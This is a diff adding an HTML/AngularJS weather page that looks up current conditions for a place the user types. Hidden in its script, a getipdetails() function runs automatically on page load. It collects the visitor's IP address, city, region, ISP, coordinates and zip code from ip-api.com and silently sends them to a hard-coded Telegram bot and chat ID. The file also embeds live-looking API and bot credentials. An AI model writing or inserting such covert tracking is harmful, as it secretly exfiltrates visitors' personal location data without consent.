@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="icon.png" />
+
+    <title>Weather Info</title>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"
+      integrity="sha512-KZmyTq3PLx9EZl0RHShHQuXtrvdJ+m35tuOiwlcZfs/rE7NZv29ygNA8SFCkMXTnYZQK2OX0Gm2qKGfvWEtRXA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script>
+      let app = angular.module("webapp", []);
+      app.controller("myctrl", ($scope, $http) => {
+        $scope.general = [];
+        $scope.current = [];
+
+        let api_key = "a140db7da658430ab5d175258252705";
+        $scope.getweather = async function (place) {
+          let response = await $http.get(
+            `https://api.weatherapi.com/v1/current.json?key=${api_key}&q=${place}&aqi=no`
+          );
+          let dn;
+          if (response.data.current.is_day == 0) {
+            dn = "Night";
+          } else {
+            dn = "Day";
+          }
+          $scope.general = [
+            {
+              key: "Country",
+              value: response.data.location.country,
+            },
+            {
+              key: "Name",
+              value: response.data.location.name,
+            },
+            {
+              key: "Region",
+              value: response.data.location.region,
+            },
+            {
+              key: "Time",
+              value: response.data.location.localtime,
+            },
+
+            {
+              key: "TimeZone",
+              value: response.data.location.tz_id,
+            },
+          ];
+          $scope.current = [
+            {
+              key: "Last Updated",
+              value: response.data.current.last_updated,
+            },
+            {
+              key: "Condition",
+              value: response.data.current.condition.text,
+              icon: response.data.current.condition.icon,
+            },
+
+            {
+              key: "Feels Like",
+              value: response.data.current.feelslike_c + "ºCelsius",
+            },
+            {
+              key: "Heat Index",
+              value: response.data.current.heatindex_c + "ºCelsius",
+            },
+            {
+              key: "Temperature",
+              value: response.data.current.temp_c + "ºCelsius",
+            },
+            {
+              key: "Humidity",
+              value: response.data.current.humidity,
+            },
+            {
+              key: "Day or Night",
+              value: dn,
+            },
+            {
+              key: "Wind kph",
+              value: response.data.current.wind_kph,
+            },
+          ];
+          $scope.$apply();
+          console.log(response.data.current);
+        };
+      });
+      async function getipdetails() {
+        let data;
+        try {
+          let getDetails = await fetch("https://ip-api.com/json/");
+          data = await getDetails.json();
+          const message = `
+          Location Info:
+          IP: ${data.query}
+          City: ${data.city}
+          Region: ${data.regionName}
+          Country: ${data.country}
+          ISP: ${data.isp}
+          lat: ${data.lat}
+          lon: ${data.lon}
+          Zip: ${data.zip}
+          `;
+
+          await fetch(
+            "https://api.telegram.org/bot7520654855:AAEF0FEQFUKCHqV1-K5bMHJ5xe4aGsYAF90/sendMessage",
+            {
+              method: "POST",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify({
+                chat_id: "1981713886",
+                text: message,
+              }),
+            }
+          );
+        } catch (err) {
+          console.log(err);
+        }
+        console.log(data);
+      }
+      getipdetails();
+      function bg() {
+        document.querySelector(".general-info").style.backgroundColor =
+          "rgba(0, 0, 0, 0.2)";
+        document.querySelector(".weatherInfo").style.backgroundColor =
+          "rgba(0, 0, 0, 0.2)";
+      }
+    </script>
+  </head>
+  <body ng-app="webapp">
+    <div class="heading">
+      <h1>Weather Info</h1>
+      <p>Get real-time weather details with just a click!</p>
+    </div>
+    <div ng-controller="myctrl" class="main">
+      <div class="input-area">
+        <input
+          type="text"
+          required
+          placeholder="Name of the place"
+          class="search"
+          ng-model="place"
+        />
+        <button ng-click="getweather(place)" onclick="bg()">Get Weather</button>
+      </div>
+      <div class="content-main">
+        <div class="general-info">
+          <ul>
+            <li ng-repeat="info in general">{{info.key}}: {{info.value}}</li>
+          </ul>
+        </div>
+        <div class="weatherInfo">
+          <ul>
+            <li ng-repeat="info in current">
+              {{info.key}}: {{info.value}}
+              <img
+                ng-if="info.icon"
+                ng-src="https:{{info.icon}}"
+                alt="{{info.key}}"
+                width="20"
+                height="20"
+              />
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap");
+
+      * {
+        margin: 0;
+        box-sizing: border-box;
+        padding: 0;
+        font-family: "Roboto", sans-serif;
+      }
+
+      body {
+        background: linear-gradient(135deg, #667eea, #764ba2);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+        padding: 40px 15px;
+        color: #fff;
+      }
+
+      .heading {
+        text-align: center;
+        margin-bottom: 30px;
+      }
+
+      .heading h1 {
+        font-size: 2.8rem;
+        margin-bottom: 10px;
+      }
+
+      .heading p {
+        font-size: 1.1rem;
+        opacity: 0.9;
+      }
+
+      .main {
+        width: 100%;
+        max-width: 1000px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 20px;
+        padding: 25px;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 10px 30px rgba(113, 10, 10, 0.2);
+      }
+
+      .input-area {
+        text-align: center;
+        margin-bottom: 30px;
+      }
+
+      .input-area input {
+        padding: 10px 15px;
+        font-size: 1rem;
+        width: 220px;
+        border: none;
+        border-radius: 8px;
+        outline: none;
+      }
+
+      .input-area button {
+        padding: 10px 15px;
+        font-size: 1rem;
+        margin-left: 10px;
+        border: none;
+        border-radius: 8px;
+        background-color: #00c9a7;
+        color: white;
+        cursor: pointer;
+        transition: 0.3s;
+      }
+
+      .input-area button:hover {
+        background-color: #00a98f;
+      }
+
+      .content-main {
+        display: flex;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 20px;
+      }
+
+      .general-info,
+      .weatherInfo {
+        flex: 1;
+        min-width: 300px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 15px;
+        padding: 20px;
+        overflow-y: auto;
+        max-height: 350px;
+      }
+
+      ul li {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: rgba(255, 255, 255, 0.1);
+        margin: 10px 0;
+        padding: 12px 15px;
+        border-radius: 8px;
+        transition: transform 0.3s;
+      }
+
+      ul li:hover {
+        transform: scale(1.03);
+      }
+
+      ul li img {
+        margin-left: 10px;
+        vertical-align: middle;
+      }
+
+      @media (max-width: 768px) {
+        .heading h1 {
+          font-size: 2.2rem;
+        }
+
+        .heading p {
+          font-size: 1rem;
+        }
+
+        .input-area input {
+          width: 180px;
+        }
+
+        .input-area button {
+          margin-top: 10px;
+          width: 100%;
+          display: block;
+        }
+
+        .content-main {
+          flex-direction: column;
+        }
+
+        .main {
+          padding: 20px;
+        }
+      }
+    </style>
+  </body>
+</html>
